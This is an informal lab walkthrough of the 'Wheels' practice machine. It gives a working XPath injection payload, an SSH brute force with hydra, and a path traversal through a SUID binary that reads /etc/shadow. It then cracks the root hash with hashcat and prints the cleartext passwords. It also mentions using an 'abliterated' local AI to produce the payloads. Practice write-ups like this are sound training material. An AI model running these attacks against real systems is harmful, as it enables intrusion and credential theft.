This lab demonstrates leveraging an XPATH injection vulnerability in a web application to retrieve sensitive information, such as user credentials. Learners will use the credentials to gain an initial foothold via SSH. Privilege escalation is achieved by reverse-engineering a SUID binary, exploiting path traversal vulnerabilities to read the contents of /etc/shadow, and cracking the root password hash using hashcat. This lab highlights XPATH injection, reverse engineering, and privilege escalation through file abuse.

```

???(kali?kali)-[~]
??$ nmap -sS -sV WHEELS
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 21:46 +0000
Nmap scan report for WHEELS (192.168.57.202)
Host is up (0.00035s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.37 seconds



```

port 22, 80. cool

https://medium.com/@ardian.danny/oscp-practice-series-3-proving-grounds-wheels-2afd23a1fb65


we need to register a user with this email. info@wheels.service

that guide may be wrong.

https://meetcyber.net/proving-grounds-practice-wheels-ec2758e0ac53

okay. let's try potato@wheels.service

potato@wheels.service
potato
potato


http://wheels/portal.php?work=car&action=search

hmm, xpath injection huh?

https://hacktricks.wiki/en/pentesting-web/xpath-injection.html

inject `work` parameter.

local AI abliterated.

> xpath injection payloads for burp suite - `//password` - permute the beginning


```sh


# http://wheels/portal.php?work=car&action=search

# this one works in the `work` param value
')]+|+//password%00

http://wheels/portal.php?work=')]+|+//password%00&action=search

```

hydra time...

```sh
hydra -L users -P passwords ssh://WHEELS
# [22][ssh] host: WHEELS   login: bob   password: Iamrockinginmyroom1212

```

so `bob:Iamrockinginmyroom1212` is a cred for ssh. neat.

```
ssh bob@WHEELS
Iamrockinginmyroom1212
```

now. on to finding a SUID binary.

okay. `getcap -r / 2>/dev/null`.

```
bob@wheels:~$ getcap -r / 2>/dev/null
/snap/core20/1581/usr/bin/ping = cap_net_raw+ep
/snap/core20/1587/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep



```


nope. wrong command. `getcap` is not suid. it's capabilities.

```
find / -perm -4000 -type f 2>/dev/null

bob@wheels:~$ find / -perm -4000 -type f 2>/dev/null
/opt/get-list
bob@wheels:~$ 
  
```


`/opt/get-list` seems sussy. `strings` time...

```
scp bob@WHEELS:/opt/get-list ./
Iamrockinginmyroom1212


Which List do you want to open? [customers/employees]: 
customers
employees
Opening File....
/bin/cat /root/details/%s
/dev/null


```

looks like we can use a local path.

path injection.


```
ssh bob@WHEELS
Iamrockinginmyroom1212

/opt/get-list 
./../../etc/shadow #employees

bob:$6$9hcN2TDv4v9edSth$KYm56Aj6E3OsJDiVUOU8pd6hOek0VqAtr25W1TT6xtmGTPkrEni24SvBJePilR6y23v6PSLya356Aro.pHZxs.:19123:0:99999:7:::

root:$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0:19123:0:99999:7:::

```

sweet. time to crack em

```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

hashcat -m 1800 '$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0' /usr/share/wordlists/rockyou.txt --show

$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0:highschoolmusical

highschoolmusical

```

root password. pwned